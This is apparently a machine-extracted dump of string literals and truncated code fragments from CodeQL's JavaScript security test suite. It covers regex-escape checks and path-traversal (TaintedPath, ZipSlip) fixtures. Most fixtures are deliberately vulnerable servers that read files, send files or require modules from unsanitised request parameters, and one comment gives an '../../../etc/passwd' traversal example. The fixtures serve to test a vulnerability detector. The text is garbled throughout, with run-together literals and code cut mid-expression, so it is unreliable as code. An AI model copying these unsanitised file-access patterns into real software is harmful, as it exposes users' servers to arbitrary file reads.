opqs	\u\xyzRegExp( ... \Y\Z");RegExp( ... X\Y\Z")"\A\B\C ... \X\Y\Z"RegExp( ... \-\=");RegExp( ... 0\-\=")"\`\1\2 ... \0\-\="`89 -=RegExp( ... \_\+");RegExp( ... )\_\+")"\~\!\@ ... \)\_\+"RegExp( ... \.\/");RegExp( ... ,\.\/")RegExp( ... \>\?");RegExp( ... <\>\?"){}\"|<>?RegExp("\ ");RegExp("\ ")/\a\b\c ... \y\z"/;/\a\b\c ... x\y\z"/\a\b\c\d\e\f\g\h\i\j\k\l\m\n\o\p\q\r\s\t\u\v\\x\y\z"\a\c\\e\f\gg\h\i\jj\k\l\mm\o\p\q\r\u \v\y\zexpected control letterexpected hexadecimal digit/\A\B\C ... X\Y\Z/;/\A\B\C ... \X\Y\Z/\A\B\C\D\E\F\G\H\I\J\K\L\M\N\O\P\Q\R\S\T\U\V\X\Y\Z\A\B\C\DD\E\F\GG\HH\II\JJ\KK\L\MM\NN\O\PP\QQ\R\T\UU\VV\X\Y\Z/\`\1\2 ... 0\-\=/;/\`\1\2 ... \0\-\=/\`\1\2\3\4\5\6\7\8\9\0\-\=\`\1\2\3\4\5\6\7\8\9\0\=invalid back reference/\~\!\@ ... )\_\+/;/\~\!\@ ... \)\_\+/\~\!\@\#\$\%\^\&\*\(\)\_\+\~~\!\@\#\$\%\^\&\(\)\_/\[\]\'\\,\.\//;\[\]\'\\,\.\/\'/\{\}\"\|\<\>\?/;\{\}\"\|\<\>\?\"\|\<\>/\ /;\ RegExp("\a");RegExp("\a")RegExp("\\a");RegExp("\\a")RegExp("\\\a");RegExp("\\\a")RegExp("\\\\a");RegExp("\\\\a")\\aRegExp("\\\\\a");RegExp("\\\\\a")RegExp("\\\\\\a");RegExp("\\\\\\a")\\\aRegExp("\\\\\\\a");RegExp("\\\\\\\a")RegExp("\\\\\\\\a");RegExp("\\\\\\\\a")\\\\aRegExp( ... \\\a");RegExp("\\\\\\\\\a")RegExp( ... \\\\a")\\\\\aRegExp("\.")"\.";/\/\\\/\\\\\//;\/\\\/\\\\\/RegExp( ... 1000");RegExp( ... u1000")"\uaaaa ... \u1000"RegExp( ... x1000")"\xaaaa ... \x1000"aaAAFF00RegExp("'\'\\'");RegExp("'\'\\'")''\'RegExp("\"\\\"");RegExp("\"\\\"")"\"RegExp( ... \\E$");RegExp( ... \\\E$")RegExp('"\"\\"')""\"RegExp('\'\\\'')'\'^\\Q\\E$RegExp("/\\*");RegExp("/\\*")/\*RegExp("/\\n");RegExp("/\\n")"/\\n"RegExp("[\.]");RegExp("[\.]")[.]RegExp("a[b\.c]d");RegExp("a[b\.c]d")a[b.c]d[b.c]RegExp("\b");RegExp("\b")RegExp(`\b`);RegExp(`\b`)`\b`RegExp(`\k\\k\d\\d`)`\k\\k\d\\d`k\kd\dRegExp( ... \d\\d`)`\k\\k${foo}\d\\d`k\kd\dRegExp("\]")RegExp("\\]")RegExp("\\\]");RegExp("\\\]")RegExp("x\\\]");RegExp("x\\\]")x\]RegExp("\\\\]")\\]RegExp("\\\\\]")RegExp("\\\\\\]")\\\]RegExp("\\\\\\\]")RegExp("\\\\\\\\]")\\\\]RegExp("\\\\\\\\\]")/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-020/tst.js OK - even though it also matches the empty string// OK - ...  stringendsWithGoodwithStringConcat"/"withStringConcatGoodwithDeltawithDeltaGoodliteral"example.com"literalGoodintLiteralintLiteralGoodlastIndexOfGoodwithIndexOfCheckGoodindexOfCheckEqualityindexOfCheckEqualityBadindexOfCheckGoodindexOfCheckGoodSharpindexOfCheckBadendsWithSlashwithIndexOfCheckBadplus"."withIndexOfCheckLowerwithIndexOfCheckLowerEq<=lastIndexNeqMinusOnelastIndexEqMinusOne{\n  ret ... OT OK\n}x.index ... .lengthx.indexOf(y){\n  ret ... // OK\n}x.lengt ... .lengthx.length >= y.lengthreturn  ... th - 1;x.index ... gth - 1x.indexOf("/" + y)"/" + yx.lengt ... gth - 1x.length > y.length{\n  let ... OT OK\n}let del ... length;delta = ... .lengthreturn  ...  delta;x.index ... = delta{\n  let ... // OK\n}delta > ... = deltadelta >= 0"example.com".lengthreturn  ... h - 11;x.index ... th - 11x.length - 11functio ... - 11;\n}{\n  ret ... - 11;\n}x.lengt ... th - 11x.length >= 11index = x.indexOf(y)index ! ... gth - 1index = ... gth - 1x.indexOf(y) !== -1indexOf ... lityBadx.indexOf(y) !== 0x.indexOf(y) >= 0indexOf ... odSharpx.indexOf(y) > -1x.indexOf(y) >= -1functio ... tring\n}{\n  ret ... tring\n}x.indexOf("/")x.length - 1index !== 0return  ... h + 1);x.index ... th + 1)x.indexOf("." + y)"." + yx.lengt ... th + 1)(y.length + 1)y.length + 1withInd ... ckLower!(index ... gth - 1!(index < 0)(index < 0)index < 0withInd ... LowerEq!(index <= -1)(index <= -1)index <= -1x.lastI ...  !== -1x.lastI ... e.com")x.lastI ...  === -1/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-022/TaintedPath/TaintedPath-es6.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-022/TaintedPath/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-022 BAD: This could read any file on the file system// BAD: ...  system'fs''http''url''path'server"public"import  ... m 'fs';import  ... 'http';import  ...  'url';import  ... 'path';var ser ... ));\n});server  ... )));\n})createS ... )));\n})functio ... h)));\n}{\n  let ... h)));\n}let pat ... y.path;path =  ... ry.pathparse(r ... ry.pathparse(r ... ).queryparse(req.url, true)req.urlres.wri ... ath)));res.wri ... path)))res.writereadFil ...  path))join("public", path)public/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-022/TaintedPath/TaintedPath.js BAD: This could still read any file on the file system BAD: Insufficient sanitisation// BAD: ... isation GOOD: Path is compared to white-list// GOOD ... te-list BAD: Path is incompletely compared to white-list// BAD: ... te-list GOOD: Path is sanitized// GOOD ... nitized GOOD: basename is safe// GOOD ... is safe BAD: taint is preserved// BAD: ... eserved GOOD: extname is safe tests for a few uri-libraries// test ... braries sanitization// sanitization remove all invalid characters from states plus slashes// remo ... slashes remove all ".."// remove all ".." OK. Is sanitized above.// OK.  ...  above. NOT OK // NOT OK  Removal of forward-slash or dots.// Remo ... r dots. OK.// OK. NOT OK (can be absolute)// NOT  ... solute) removing of "../" from prefix.// remo ... prefix. NOT OK - not normalized// NOT  ... malized tests for a few more uri-librariessanitize'sanitize-filename'pathModule"/home/user/""secret"=='foo.txt''bar.txt'someOpaqueConditiontoNamespacedPathangular'myApp'directive'myCustomer'templateUrl"SAFE"Cookie"unsafe""querystringify""query-string""querystring"express'express'applicationviews_localrender'/views/*'views_imported"./views"'message'ev/[\]\[*,;'"`<>\\?\/]/g/\.\./g'send'concattedconcatted2/[abcd]/g/[./]/g/[foobar/foobar]/g/\//g/\.|\//g/[.]/g/[..]/g/\./g/\.\.|BLA/g"prefix"/^(\.\.[\/\\])+//(\.\.[\/\\])+//(\.\.\/)+//(\.\.\/)*/normalizeUrl'normalize-url'qs"qs"parseqs"parseqs"cp"foobar""args"var fs  ... )\n    ;fs = require('fs')require('fs')http =  ... 'http')require('http')url = require('url')require('url')sanitiz ... ename')require ... ename')sanitize-filenamepathMod ... 'path')require('path')http.cr ... )));\n})url.par ... ry.pathurl.par ... ).queryurl.par ... , true)res.wri ... path));res.wri ... (path))fs.read ... c(path)res.wri ...  path))fs.read ... + path)"/home/user/" + path/home/user/if (pat ... path));path.st ... user/")path.startsWithpath.in ... ) == -1path.in ... ecret")path.indexOfsecretif (fs. ... path));fs.existsSync(path)path === 'foo.txt'foo.txttxtpath == ... ar.txt'path === 'bar.txt'bar.txtpath == ... ition()someOpa ... ition()path =  ... (path);path =  ... e(path)sanitize(path)path =  ... y.path;fs.read ... (path))pathMod ... e(path)pathModule.basenamepathModule.dirnamepathModule.extnamepathMod ... n(path)pathModule.joinres.wri ... , z)));res.wri ... h, z)))fs.read ... th, z))pathMod ... ath, z)pathModule.normalizefs.read ...  path))pathMod ... , path)pathModule.relativeres.wri ... , x)));res.wri ... h, x)))fs.read ... th, x))pathMod ... ath, x)pathModule.resolvepathMod ... h(path)pathMod ... cedPathangular ... \n    })angular ... rectiveangular ... p', [])angular.modulemyAppmyCustomerfunctio ... }\n    }return  ...       }templateUrl: "SAFE"SAFEtemplat ... nsafe")Cookie.get("unsafe")Cookie.getunsafevar ser ...  OK\n});server  ... T OK\n})http.cr ... T OK\n}){\n    / ... OT OK\n}res.wri ... uery));res.wri ... query))fs.read ... .query)require ... ).queryrequire ... eq.url)require ... ).parserequire ... ngify")querystringifyrequire ... tring")query-string(functi ... \n\n})();(functi ... ;\n\n})()(functi ... d);\n\n})functio ... ed);\n\n}{\n\n     ... ed);\n\n}var exp ... ress');express ... press')require('express')var app ... ress();applica ... press()express()var vie ... ms[0]);views_l ... ams[0])(req, r ... ams[0])res.ren ... ams[0])res.renderreq.params[0]req.paramsapplica ... local);applica ... _local)application.get/views/*/views/*var vie ... iews");views_i ... views")require("./views")./viewsapplica ... orted);applica ... ported)addEven ... a);\n});addEven ... ta);\n})(ev) => ... ata);\n}{\n  Coo ... ata);\n}Cookie. ... .data);Cookie. ... v.data)Cookie.setev.datavar ser ... );\n\n});server  ...  );\n\n})http.cr ...  );\n\n})functio ...   );\n\n}{\n\tlet  ...   );\n\n}fs.real ... c(path)fs.real ...      );fs.real ...       )functio ...       }{\n\t\t    ...       }res.wri ... lpath))fs.read ... alpath)var ser ... ve.\n});server  ... ove.\n})http.cr ... ove.\n})functio ... bove.\n}{\n  let ... bove.\n}if (pat ... .."\n  }{ // sa ... .."\n  }path =  ... g, '');path =  ... /g, '')path.re ... /g, '')/[\]\[* ... \?\/]/g[\]\[*,;'"`<>\\?\/]\.\.if (!pa ... .."\n  }!path{\n    \n  }{\n\tlet  ... OT OK\n}require ...  path);require ... , path)require('send')var ser ... K \n\n});server  ... OK \n\n})http.cr ... OK \n\n})functio ...  OK \n\n}{\n  let ...  OK \n\n}fs.read ... (path);var spl ... t("/");split = ... it("/")path.split("/")path.splitfs.read ... ("/"));fs.read ... n("/"))split.join("/")split.joinfs.read ... h - 1])prefix  ... th - 1]split[s ... th - 1]split.length - 1split.lengthfs.read ... lit[x])split[x]prefix + split[x]var con ... split);concatt ... (split)prefix.concat(split)prefix.concatconcatted.join("/")concatted.joinvar con ... refix);concatt ... prefix)split.concat(prefix)split.concatconcatted2.join("/")concatted2.joinfs.read ... pop());fs.read ... .pop())split.pop()split.popvar ser ... te)\n});server  ... ute)\n})http.cr ... ute)\n})functio ... lute)\n}{\n  let ... lute)\n}res.wri ...  '')));res.wri ... , '')))fs.read ... g, ''))[abcd][./][foobar/foobar]\.|\/[..]\.\.|BLABLAif (!pa ...  OK\n  }!pathMo ... e(path)pathMod ... bsolute{\n    r ...  OK\n  }fs.read ... /, ''))"prefix ... +/, '')pathMod ... +/, '')pathMod ... replace^(\.\.[\/\\])+(\.\.[\/\\])+(\.\.[\/\\])\.\.[\/\\][\/\\](\.\.\/)+(\.\.\/)\.\.\/"prefix ... */, '')pathMod ... */, '')(\.\.\/)*path.re ... +/, '')import  ... e-url';normalize-url{\n  //  ... OT OK\n}const q ... ("qs");qs = require("qs")require("qs")res.wri ... .foo));res.wri ... ).foo))fs.read ... l).foo)qs.pars ... rl).fooqs.parse(req.url)qs.parsefs.read ... )).foo)qs.pars ... l)).fooqs.pars ... q.url))normali ... eq.url)const p ... seqs");parseqs ... rseqs")require("parseqs")parseqs ... rl).fooparseqs ... eq.url)parseqs.decodeconst c ... cess");cp = re ... ocess")cp.exec ... path});cp.exec ...  path})cp.execSyncfoobar{cwd: path}cwd: pathcp.execFileSync["args"]/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-022/TaintedPath/fs.js Adapted from externs generated from TypeScript type definitions provided// Adap ... rovided by DefinitelyTyped, which is licensed under the MIT license; see file// by D ... ee file DefinitelyTyped-LICENSE.// Defi ... ICENSE.module.exports = fs;module.exports = fs/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-022/TaintedPath/my-async-fs-module.jspromisify'bluebird'methods'readFile''writeFile''readFileSync''writeFileSync'const f ... ('fs');const { ... bird');{promis ... ebird'){promisify}require('bluebird')bluebirdconst m ... ync'\n];methods ... Sync'\n][\n  're ... Sync'\n]module. ... }, {});module. ... \n}, {})methods ... \n}, {})methods.reduce(obj, m ...  obj;\n}{\n  obj ...  obj;\n}obj[met ... thod]);obj[met ... ethod])obj[method]promisi ... ethod])fs[method]return obj;/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-022/TaintedPath/my-fs-module.js"fs""original-fs"exports ... ;\n\t}\n};exports ... );\n\t}\n}exports.requirefunctio ... );\n\t}\n}{\n\tif ( ... );\n\t}\n}if (spe ... s");\n\t}{\n\t\tret ... s");\n\t}return  ... ("fs");require("fs")return  ... l-fs");require ... al-fs")original-fs/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-022/TaintedPath/normalizedPaths.js NOT OK - wrong polarity// NOT  ... olarity NOT OK - could be absolute// NOT  ... bsolute OK - coerced to relative// OK - ... elative NOT OK - not coerced// NOT  ... coerced Coerce to relative prior to normalization// Coer ... ization NOT OK - can still contain '../'// NOT  ... n '../' Combined absoluteness and folder check in one startsWith call// Comb ... th call OK - both absolute and normalized before check// OK - ... e check OK - normalized and coerced to relative NOT OK - prefixing foo/ invalidates check// NOT  ... s check NOT OK - can still be absolute Regression test for a specific corner case:// Regr ... r case: Some guard nodes sanitize both branches, but for a different set of flow labels.// Some ... labels. Verify that this does not break anything.// Veri ... ything. OK - but flagged anyway [INCONSISTENCY]// OK - ... STENCY] NOT OK! // NOT OK!  OK! // OK!  NOT OK!// NOT OK! OK!// OK! NOT OK - can be of the form 'safe/directory/../../../etc/passwd'// NOT  ... passwd''/basic''./''/index.html''index.html''/home/user/www''/normalize''/normalize-notAbsolute'"..""../"'/normalize-noInitialDotDot'"./"'/prepend-normalize''/absolute''/normalized-absolute''/combined-check'"/home/user/www"'/realpath''.''/coerce-relative''..''/coerce-absolute''/concat-after-normalization''foo/''/noDotDot''/join-regression''/''/x'normalizedPath'/home/user/public''/decode-after-normalization''/replace'/%20/g' ''/resolve-path''/relative-startswith'webrootnewpathrelativePathworkspaceDir'../'isPathInside"is-path-inside"pathIsInside"path-is-inside"'/pseudo-normalizations''/yet-another-prefix'rootPath'/yet-another-prefix2'requestPathtargetPathallowPathslash'slash''/slash-stuff'let app = express();app = express()app.get ...  OK\n});app.get ... T OK\n})app.get/basic(req, r ... OT OK\n}req.query.pathreq.queryfs.read ...  path);'./' + path./fs.read ... html');fs.read ... .html')path + '/index.html'fs.read ... tml'));fs.read ... html'))pathMod ... .html')fs.read ... path));/home/user/www/normalizelet pat ... .path);path =  ... y.path)pathMod ... y.path)app.get ... / OK\n})'/norma ... solute'/normalize-notAbsolute(req, r ... // OK\n}if (pat ... return;return;if (!pa ... (path);!path.s ... th(".")path.startsWith(".")!path.s ... h("..")path.st ... h("..")!path.s ... ("../")path.st ... ("../")../!path.s ... le.sep)path.st ... le.sep)".." +  ... ule.seppathModule.sep'/norma ... DotDot'/normalize-noInitialDotDot"./" + pathfs.read ... html");fs.read ... .html")path + "/index.html"/prepend-normalize'./' +  ... ry.pathapp.get ... ./'\n});app.get ... ../'\n})/absolute(req, r ... '../'\n}{\n  let ... '../'\n}if (!pa ... return;path.st ... r/www')/normalized-absolute/combined-checkif (pat ... (path);path.st ... r/www")path[0] ... !== "."path[0] !== "/"path[0]path[0] !== "."/realpathfs.real ... y.path)/coerce-relative!path.s ... h('..')path.st ... h('..')/coerce-absolute'/conca ... zation'/concat-after-normalization'foo/'  ... y.path)foo/!path.includes('..')path.includes('..')path.includes/noDotDot/join-regressionif (pat ... {path;}{path;}path;path.startsWith('/')path.st ... h('/x')/xpath.startsWith('.')!path.i ... e(path)let nor ... (path);normali ... e(path)if (nor ... dPath);normali ... r/www')normali ... rtsWithfs.read ... dPath);fs.read ... edPath)normali ... ublic')/home/user/publicapp.get ... zed\n});app.get ... ized\n})'/decod ... zation'/decode-after-normalization(req, r ... lized\n}{\n  let ... lized\n}!pathMo ... h('..')path =  ... t(path)decodeU ... t(path)app.get ...   }\n});app.get ... \n  }\n})/replace(req, r ... K\n  }\n}{\n  let ... K\n  }\n}let pat ... , ' ');path =  ... g, ' ')pathMod ... g, ' ')%20{\n    f ...  OK\n  }app.get ... ity\n});app.get ... rity\n})/resolve-path(req, r ... arity\n}{\n  let ... arity\n}var sel ... hing();self = something()something()path.su ... elf.dirpath.su ... length)path.substringself.dir.lengthself.dirpath.sl ... elf.dirpath.sl ... length)path.slice'/relat ... tswith'/relative-startswith(req, r ...  \n  }\n}{\n  let ...  \n  }\n}var rel ...  path);relativ ... , path)self.webrootif(rela ... K! \n  }relativ ... == ".."relativ ... le.sep)relative.startsWithrelative == ".."{\n    f ... K! \n  }let new ... (path);newpath ... e(path)var rel ... wpath);relativ ... ewpath)pathMod ... ewpath)pathMod ... aceDir)if (rel ... OK!\n  }relativ ... ) === 0relativePath.indexOf'..' +  ... ule.sep{\n    f ... OK!\n  }fs.read ... wpath);fs.read ... ewpath)if (rel ... K! \n  }relativ ... ('../')if (pat ... K! \n  }pathMod ... ) === 0pathMod ... ('../')pathMod ... indexOfpathMod ... vePath)var isP ... side");isPathI ... nside")require ... nside")is-path-insidepathIsI ... nside")path-is-insideapp.get ... \t}\n\n});app.get ... \n\t}\n\n})'/pseud ... ations'/pseudo-normalizations(req, r ... \n\n\t}\n\n}{\n\tlet  ... \n\n\t}\n\n}if (isP ...  OK\n\n\t}isPathI ... , SAFE){\n\t\tfs. ... urn;\n\t}{\n\t\tfs. ...  OK\n\n\t}if (pat ...  OK\n\n\t}pathIsI ... , SAFE)let nor ...  path);normali ... , path)if (pat ... T OK\n\t}{\n\t\tfs. ... T OK\n\t}'/yet-a ... prefix'/yet-another-prefix{\n\tlet  ... // OK\n}var abs ... (path);abs = p ... e(path)if (abs ... ;\n    }abs.ind ... ) !== 0abs.indexOf(root)abs.indexOf{\n\t\tfs. ... ;\n    }var roo ... .cwd();rootPat ... s.cwd()process.cwd()process.cwd'/yet-a ... refix2'/yet-another-prefix2(req, r ... ;\n  }\n}{\n  let ... ;\n  }\n}var req ...  path);request ... , path)var targetPath;if (!al ...  OK\n  }!allowP ... otPath)allowPa ... otPath){\n    t ...  OK\n  }targetP ... otPath;targetP ... ootPathfs.read ... tPath);fs.read ... stPath)targetP ... stPath;targetP ... estPathfs.read ... etPath)functio ...  0;\n  }{\n    r ...  0;\n  }return  ...  === 0;request ... ) === 0request ... otPath)requestPath.indexOfimport  ... slash';/slash-stuffslash(path)/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-022/TaintedPath/other-fs-libraries.js"url"gracefulFs"graceful-fs"fsExtra"fs-extra"originalFsgetFsModule"./my-fs-module"flexibleModuleName"electron""bluebird"promisifyAllasyncFS"./my-async-fs-module""pify"'util.promisify'"thenify"readPkg'read-pkg'readPackageSyncpkgPromisereadPackageAsyncmkdirp"mkdirp"var htt ... l-fs");url = require("url")require("url")fs = require("fs")gracefu ... ul-fs")require ... ul-fs")graceful-fsfsExtra ... extra")require("fs-extra")fs-extraorigina ... al-fs"){\n  var ... OT OK\n}var pat ... y.path;gracefu ... (path);gracefu ... c(path)gracefu ... ileSyncfsExtra ... (path);fsExtra ... c(path)fsExtra.readFileSyncorigina ... (path);origina ... c(path)origina ... ileSyncgetFsMo ... (path);getFsMo ... c(path)getFsMo ... ileSyncgetFsModule(true)getFsModule(false)require ... (path);require ... c(path)require ... ileSyncrequire ... e(true)require ... requirerequire ... odule")./my-fs-module/my-fs-modulelet fle ...  "fs");flexibl ... : "fs")require ... : "fs")process ...  : "fs"process ... ctron"]process.versionselectronflexibl ... (path);flexibl ... c(path)flexibl ... ileSyncfunctio ... ;\n  }\n}{\n  if  ... ;\n  }\n}if (spe ... ");\n  }{\n    r ... ");\n  }http.cr ...  OK\n});util.pr ... (path);util.pr ... )(path)util.pr ... leSync)util.promisifyrequire ... )(path)require ... leSync)require ... omisifyrequire("bluebird")require ... All(fs)require ... sifyAllconst a ... dule");asyncFS ... odule")"./my-a ... module"./my-async-fs-module/my-async-fs-moduleasyncFS ... (path);asyncFS ... c(path)asyncFS.readFileSyncrequire("pify")pifyrequire("pify")(fs)require ... isify')require("thenify")thenifyconst r ... -pkg');readPkg ... d-pkg')require('read-pkg')read-pkgvar pkg ... path});pkg = r ...  path})readPkg ...  path})readPkg ... ageSyncpkgProm ...  path})readPkg ... geAsyncconst m ... dirp");mkdirp  ... kdirp")require("mkdirp")mkdirp(path);mkdirp(path)mkdirp.sync(path);mkdirp.sync(path)mkdirp.sync/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-022/TaintedPath/prettier.jsprettier"prettier"'/some/path'resolveConfigformatted"foo""bar"const e ... ress');const p ... tier");prettie ... ttier")require("prettier")const a ... ress();app.get ... });\n});app.get ...  });\n})/some/pathfunctio ...   });\n}{\n    c ...   });\n}const { ... params;{ p } = req.params{ p }prettie ...     });prettie ... \n    })prettie ... p).thenprettie ... nfig(p)prettie ... eConfig(option ... ;\n    }{ // NO ... ;\n    }const f ... tions);formatt ... ptions)prettie ... ptions)prettier.formatprettie ... }).thenprettie ... ig: p}){config: p}config: p/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-022/TaintedPath/pupeteer.jspuppeteer'puppeteer'parseTorrent'parse-torrent'tainted"dir/"torrent".torrent.data"browserawaitlaunchnewPagepdf'a4'pages++screenshotconst p ... teer');puppete ... eteer')require('puppeteer')const p ... rent');parseTo ... rrent')require ... rrent')parse-torrent(async  ... ;\n})();(async  ... );\n})()(async  ... e();\n})async ( ... se();\n}{\n    l ... se();\n}let tai ... .data";tainted ... t.data""dir/"  ... t.data""dir/"  ... t).namedir/parseTo ... t).nameparseTo ... orrent).torrent.dataconst b ... unch();browser ... aunch()await p ... aunch()puppeteer.launch()puppeteer.launchconst p ... Page();page =  ... wPage()await b ... wPage()browser.newPage()browser.newPageawait p ... a4' });await p ... 'a4' })page.pd ... 'a4' })page.pdf{ path: ...  'a4' }path: taintedformat: 'a4'a4const p ... ages();pages = ... pages()await b ... pages()browser.pages()browser.pagesfor (le ... ;\n    }i < something()i++let i = 0i = 0{\n      ... ;\n    }pages[i ... ted });pages[i ... nted })pages[i].screenshotpages[i]{ path: tainted }await b ... lose();await b ... close()browser.close()browser.close/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-022/TaintedPath/tainted-access-paths.jsbla"safe"sub3sub4var fs  ... 'url');var obj ... : path;obj = b ...  : pathbla ? s ...  : pathfs.read ... j.sub);fs.read ... bj.sub)obj.subobj.sub = "safe";obj.sub = "safe"safeobj.sub2 = "safe";obj.sub2 = "safe"obj.sub2if (ran ...  OK\n  }random()fs.read ... .sub2);fs.read ... j.sub2)if (ran ... fe"\n  }{\n    o ... fe"\n  }obj.sub3 = "safe"obj.sub3fs.read ... .sub3);fs.read ... j.sub3)obj.sub ... .sub4);obj.sub ... j.sub4)obj.sub4fs.read ... j.sub4)server.listen();server.listen()server.listen/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-022/TaintedPath/tainted-array-steps.js BAD - but not flagged because we have no array-steps [INCONSISTENCY]// BAD  ... STENCY]'public'partsvar ser ... CY]\n});server  ... NCY]\n})http.cr ... NCY]\n})functio ... ENCY]\n}{\n  let ... ENCY]\n}res.wri ... '/')));res.wri ... ('/')))fs.read ... n('/'))['publi ... in('/')['publi ... h].join['public', path]let par ...  path];parts = ... , path]parts = ... ase());parts = ... Case())parts.m ... Case())parts.mapx => x.toLowerCase()x.toLowerCase()x.toLowerCaseparts.join('/')parts.join/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-022/TaintedPath/tainted-require.js BAD: loading a module based on un-sanitized query parameters// BAD: ... ameters NOT OK - resolving module based on query parameters// NOT  ... ameters"module""resolve"basedirvar app = express();app.get ... ));\n});app.get ... "));\n})functio ... e"));\n}{\n  //  ... e"));\n}var m = ... ule"));m = req ... dule"))require ... dule"))req.param("module")req.paramconst r ... olve");resolve ... solve")require("resolve"){\n  var ...   });\n}var mod ... ule"));module  ... dule"))resolve ... dule"))resolve.syncresolve ... ;\n  });resolve ... s;\n  }){ based ... rname }basedir: __dirnamefunctio ... es;\n  }{ // NO ... es;\n  }var module = res;module = res/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-022/TaintedPath/tainted-sendFile.js BAD: sending a file based on un-sanitized query parameters BAD: same as above// BAD: ... s above GOOD: ensures files cannot be accessed outside of root folder// GOOD ...  folder BAD: doesn't help if user controls root// BAD: ... ls root OK: sendFile disallows ../// OK:  ... ows ../ OK: sendfile disallows ../ kinda OK - can only escape from 'data/'// kind ... 'data/''/some/path/:x'sendFile"gimme"sendfile"file""dir"homeDir'/data/''data/'let pat ... path');path =  ... 'path')app.get ... a/'\n});app.get ... ta/'\n})/some/path/:xfunctio ... ata/'\n}{\n  //  ... ata/'\n}res.sen ... mme"));res.sen ... imme"))res.sendFilereq.param("gimme")gimmeres.sendfileres.sen ... d() });res.sen ... wd() }){ root: ... cwd() }root: process.cwd()res.sen ... r") });res.sen ... ir") })req.param("file"){ root: ... dir") }root: r ... ("dir")req.param("dir")let hom ... e('.');homeDir ... ve('.')path.resolve('.')res.sen ... ams.x);res.sen ... rams.x)homeDir ... arams.xhomeDir + '/data/'/data/req.params.x'data/' ... arams.xdata/res.sen ... ms.x));res.sen ... ams.x))path.re ... rams.x)path.jo ... rams.x)homeDir ... rams.x)/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-022/TaintedPath/tainted-string-steps.js OK (readFile throws an exception when the filename is an array)// OK ( ...  array) OK -- for now// OK -- for now NOT OK -- but not yet flagged [INCONSISTENCY]// NOT  ... STENCY] OK -- but still flagged [INCONSISTENCY]unknown/\//"?"fs.read ... i, j));fs.read ... (i, j))path.substring(i, j)fs.read ... ng(4));fs.read ... ing(4))path.substring(4)fs.read ... 0, i));fs.read ... (0, i))path.substring(0, i)fs.read ... tr(4));fs.read ... str(4))path.substr(4)path.substrfs.read ... ce(4));fs.read ... ice(4))path.slice(4)fs.read ... nown));fs.read ... known))path.concat(unknown)path.concatunknown.concat(path)unknown.concatunknown ... , path)fs.read ... rim());fs.read ... trim())path.trim()path.trimfs.read ... ase());fs.read ... Case())path.toLowerCase()path.toLowerCasefs.read ... ('/'));fs.read ... t('/'))path.split('/')fs.read ... ')[0]);fs.read ... /')[0])path.split('/')[0]fs.read ... ')[i]);fs.read ... /')[i])path.split('/')[i]fs.read ... /)[i]);fs.read ... //)[i])path.split(/\//)[i]path.split(/\//)fs.read ... ")[0]);fs.read ... ?")[0])path.split("?")[0]path.split("?")fs.read ... n)[i]);fs.read ... wn)[i])path.sp ... own)[i]path.split(unknown)fs.read ... tever);fs.read ... atever)path.sp ... hateverfs.read ... ")[i]);fs.read ... ?")[i])path.split("?")[i]/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-022/TaintedPath/torrents.jsgetTorrentDatalocconst p ... ('fs');let nam ... .data";name =  ... t).nameloc = d ... t.data"dir + " ... t.data"dir + "/" + namedir + "/"return  ... c(loc);fs.readFileSync(loc)/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-022/TaintedPath/typescript.ts GOOD: path is falsy// GOOD ... s falsy BAD: path is truthy// BAD: ...  truthy GOOD - path is null or undefined - but we don't capture that. [INCONSISTENCY]// GOOD ... STENCY] GOOD: path is either falsy or "clean";// GOOD ... clean"; BAD: path can still be tainted// BAD: ... taintedpath2||=path3&&=path4??=path5"clean"path6var ser ... ed\n\n});server  ... ted\n\n})http.cr ... ted\n\n})functio ... nted\n\n}{\n  let ... nted\n\n}let path2 = path;path2 = pathpath2 | ... ath2));path2 | ... path2))res.wri ... path2))fs.read ... (path2)let path3 = path;path3 = pathpath3 & ... ath3));path3 & ... path3))res.wri ... path3))fs.read ... (path3)let path4 = path;path4 = pathpath4 ? ... ath4));path4 ? ... path4))res.wri ... path4))fs.read ... (path4)let path5 = path;path5 = pathpath5 &&= "clean";path5 &&= "clean"cleanres.wri ... ath5));res.wri ... path5))fs.read ... (path5)let path6 = path;path6 = pathpath6 ||= "clean";path6 ||= "clean"res.wri ... ath6));res.wri ... path6))fs.read ... (path6)typescript/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-022/TaintedPath/views.jsmodule. ... ms[0]);module. ... ams[0])/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-022/ZipSlip/AdmZipBad.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-022/ZipSlipAdmZip'adm-zip'zip"archive.zip"zipEntrieszipEntryentryNamevar Adm ... -zip');AdmZip  ... m-zip')require('adm-zip')adm-zipvar zip ... .zip");zip = n ... e.zip")new Adm ... e.zip")archive.zipvar zip ... ries();zipEntr ... 